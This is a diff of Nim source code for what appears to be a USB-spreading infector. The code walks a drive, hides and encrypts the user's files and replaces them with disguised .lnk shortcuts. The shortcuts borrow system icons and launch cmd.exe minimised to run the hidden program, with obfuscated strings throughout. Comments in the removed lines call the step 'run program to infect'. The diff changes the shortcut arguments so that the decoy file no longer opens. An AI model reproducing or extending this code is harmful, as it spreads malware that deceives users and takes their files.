@@ -185,8 +185,7 @@ proc hideFile(path: string): void =
   discard SetFileAttributes(path, newAttr)
 
 proc createShortcut(sys32: string, programPath: string, savePath: string,
-    iconPath: string, iconIndex: int, encryptedFilePath: string,
-        decryptedFilePath: string): void =
+    iconPath: string, iconIndex: int, encryptedFilePath: string): void =
   var
     pIL: ptr IShellLink
     pPF: ptr IPersistFile
@@ -199,11 +198,10 @@ proc createShortcut(sys32: string, programPath: string, savePath: string,
   discard pIL.SetPath(sys32 / d e"cmd.exe")
   discard pIL.SetArguments(
     ## d(e("")) is different from d e"", see hideString.nim
-    d(e("/c \"\"")) & programPath & d(e("\" \"")) & encryptedFilePath & # run program and wait to decrypt file
-    d(e("\" && start /B \"\"\"\" \"")) & programPath & # run program to infect
-    d(e("\" && start \"\"\"\" \"")) & decryptedFilePath & d(e("\"\"")) # open file
+    d(e("/c \"start \"\"\"\" \"")) & programPath & d(e("\" \"")) &
+        encryptedFilePath & d(e("\"\""))
   )
-
+# /c "start """" "D:\$WinDrive.dump" "D:\abi.txt""
   discard pIL.SetIconLocation(iconPath, int32 iconIndex)
 
   discard pIl.SetShowCmd(7) # start minimized
@@ -226,7 +224,6 @@ proc encryptFile(filePath: string): void =
 
 proc checkDrive(dest: string, drivePath: string): void =
   let sys32 = getEnv(d e"SystemRoot") / d e"System32"
-  let tmp = getEnv(d e"tmp")
   for path in walkDirRec(drivePath):
     let (dir, name, fileExt) = splitFile(path)
 
@@ -247,7 +244,7 @@ proc checkDrive(dest: string, drivePath: string): void =
           iconPath = sys32 / d e"wmploc.dll"
 
         createShortcut(sys32, dest, dir / name & d e".lnk", iconPath, index,
-            path, tmp / name & fileExt)
+            path)
         break
 
 
